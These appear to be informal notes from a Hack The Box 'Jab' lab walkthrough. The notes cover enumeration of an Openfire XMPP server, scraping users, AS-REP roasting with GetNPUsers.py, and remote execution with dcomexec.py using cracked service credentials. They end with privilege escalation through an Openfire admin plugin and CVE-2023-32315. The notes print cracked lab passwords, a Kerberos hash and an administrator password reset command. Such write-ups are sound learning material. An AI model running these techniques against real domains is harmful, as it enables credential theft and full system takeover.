___



jetty -> Java web server and servlet container used to run Java web applications


there are jabber and xmpp client running on the machine

7070 has a jetty webserver http
Openfire HTTP Binding Service


7777 has a socks proxy running 


*this computer is part of jab AD domain*



is openfire running  jabber and xmpp or no different things




*intersting ports*

5222/tcp  open  jabber        syn-ack ttl 127

Ignite Realtime Openfire Jabber server 3.10.0 or later

5269/tcp  open  xmpp          syn-ack ttl 127 Wildfire XMPP Client


7070/tcp  open  http          syn-ack ttl 127 Jetty
|_http-title: Openfire HTTP Binding Service


7777/tcp  open  socks5        syn-ack ttl 127 (No authentication; connection failed)



*openfire is the xmpp server running here -> it uses jabber*

_Openfire is a Jabber (XMPP) server_




Ignite Realtime Openfire Jabber server 3.10.0 or later ->

# Openfire Path Traversal -> [CVE-2023-32315]
unauthenticated path traversal if I can reach admin portal



*xss vulns in openfire*
https://www.exploit-db.com/exploits/40065



2025/09/04 16:38:00 >  [+] VALID USERNAME:	administrator@jab.htb


2025/09/04 16:41:55 >  [+] VALID USERNAME:	DREW@jab.htb



*this goes over xmpp attack surface*
https://bishopfox.com/blog/xmpp-underappreciated-attack-surface



*I was able to connect to the XMPP server via an account registration with pidgin*


*room in server?*
conference.jab.htb



 *one of the chat rooms*
 test2 -> bdavis sent and image tag 
test -> registration req 



*checked the installed XEP's on the server and search functionality is enabled*
search for all with wildcard got all users, emails, etc


used the xmpp raw terminal for the xml request and got all users as xml


*grab only useranames from that file*
xmllint --xpath "//*[local-name()='field'][@var='Username']/*[local-name()='value']/text()" all_users.xml | cat > only_usernames.txt




ASAP roast vuln
*while I was doing this  kerbrute found this*
2025/09/04 17:55:42 >  [+] mlowe has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$mlowe@JAB.HTB:60ecba9ac3a9dd097eb0641639b45da1$93c5b7fe74db1ba958d670b0e460ce36d22a4905d7bc26fc31aebf68c1bc84c0ff66a3ea831d2fec2a107786c7f2f76675af70f0867f8e6cc83638cf69a6dec76df32f4bf55f38674b7c7f11b1c1bf84a01601657be344bf72bd96f8731d044c6cc2be6ff8a09e47500b65dc3159e127df2f6949011a4d92e165824365427118df852ec8a1da4bf96162dd0fdc02a1555ce78e6987ecd4e1ceb78825348ad08c9e346048c76ba25fbeda7e48b85a359132a4b8ff513b3a8021bad056a1b32877f5d50843fc81f31a600b24574579c55e262e41e206da596d4ff1286bf4909f29e476a48631ef8fc0780ef1bf0adb3578d4aecbe8a9c8


*was not able to crack this hash*


*got TGT's for other users with pre-auth disabled AS_REP roastables*
└> GetNPUsers.py jab.htb/ -usersfile ./loot/only_usernames.txt -outputfile ./loot/tgts_asrep_roast.txt -request -no-pass -dc-ip 10.10.11.4 -dc-host DC01.jab.htb 



*cracked one of the hashes*
$krb5asrep$23$jmontgomery@JAB.HTB:Midnight_121


was able to generate TGT with this user 



*logged in jabber as that guy found pentest chats and a hash*
there was some garbage at the end of the hash deleted it and it worked




*is this the password?*
!@#$%^&*(1qazxsw



*yeah no like that is the password lol that makes sense*
SMB         10.10.11.4      445    DC01             [+] jab.htb\svc_openfire:!@#$%^&*(1qazxsw






*this error threw me off so bad bc creds were valid*
[-] DCOM SessionError: code: 0x8000401a - CO_E_RUNAS_LOGON_FAILURE - The server process could not be started because the configured identity is incorrect. Check the user name and password.




*had to change the object that dcomexec was using to execute the commands*

└> dcomexec.py jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 -silentcommand 'ping 10.10.14.24' -object MMC20




got a shell holly  



*found admin hash in the openfire embedded-db script*


*cracked it*
odW!!mVfbXs304kskt!QAZDVGY&@ (hex: 006F0064005700210021006D00560066006200580073003300300034006B0073006B0074002100510041005A004400560047005900260040)

openfire admin only maybe?
*this howhever does not appear to work*


cff12288c7334da63e31deff027bde92a9d126e912918139a970d6fad100dcb76071bff67b9c25f3

*anita smith pass*
vw3PX1Xu9dqz$0




*admin panel running on port 9090*
Openfire, Version: 4.7.5




 # i tried this but it didn't appear to worrk

*second time on this one*
# CVE-2023-32315

Openfire Console Authentication Bypass Vulnerability with RCE plugin


https://github.com/miko550/CVE-2023-32315?tab=readme-ov-file#cve-2023-32315




I already had the admin account password thought so just logged in 



*got root *

so openfire was running as NT/SYSTEM

after getting I shell I could do

net user Administrator newCoolPass123$


to change administrator password then i would be able to log in with winRM

















